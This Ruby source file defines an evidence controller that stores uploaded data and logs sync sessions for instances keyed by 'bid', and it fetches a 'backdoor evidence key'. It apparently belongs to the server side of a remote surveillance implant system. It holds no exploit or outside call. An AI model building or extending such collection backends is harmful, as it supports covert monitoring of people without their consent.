#
# Controller for the Evidence objects
#

require 'rcs-db/db_layer'

require 'rcs-common/evidence_manager'

require 'eventmachine'
require 'em-http-request'
require 'time'
require 'json'

module RCS
module DB

class EvidenceController < RESTController

  def index
    require_auth_level :viewer
    trace :debug, "INDEX #{params}"
  end

  def show
    require_auth_level :viewer
    trace :debug, "SHOW #{params}"
  end

  # this must be a POST request
  # the instance is passed as parameter to the uri
  # the content is passed as body of the request
  def create
    require_auth_level :server

    # create a phony session
    session = {:instance => params[:evidence]}

    # save the evidence in the db
    begin
      id = EvidenceManager.store_evidence session, @req_content.size, @req_content
      #TODO: notify the worker
      trace :debug, "notifying worker of [#{session[:instance]}][#{id}]"
      notification = {session[:instance] => [id]}.to_json
      request = EM::HttpRequest.new('http://127.0.0.1:5150').post :body => notification
      request.callback {|http| http.response}
    rescue
      return STATUS_NOT_FOUND
    end

    return STATUS_OK, *json_reply({:bytes => @req_content.size})
  end
  
  # used to report that the activity of an instance is starting
  def start
    require_auth_level :server

    # create a phony session
    session = {:bid => params['bid'],
               :build => params['build'],
               :instance => params['instance'],
               :subtype => params['subtype']}

    # retrieve the key from the db
    key = DB.backdoor_evidence_key(params['bid'])

    # convert the string time to a time object to be passed to 'sync_start'
    time = Time.at(params['sync_time'])
    
    # store the status
    EvidenceManager.sync_start session, params['version'], params['user'], params['device'], params['source'], time, key

    return STATUS_OK
  end

  # used to report that the processing of an instance has finished
  def stop
    require_auth_level :server

    # create a phony session
    session = {:bid => params['bid'],
               :instance => params['instance']}

    # store the status
    EvidenceManager.sync_end session

    return STATUS_OK
  end

  # used to report that the activity on an instance has timed out
  def timeout
    require_auth_level :server

    # create a phony session
    session = {:bid => params['bid'],
               :instance => params['instance']}

    # store the status
    EvidenceManager.sync_timeout session

    return STATUS_OK
  end

end

end #DB::
end #RCS::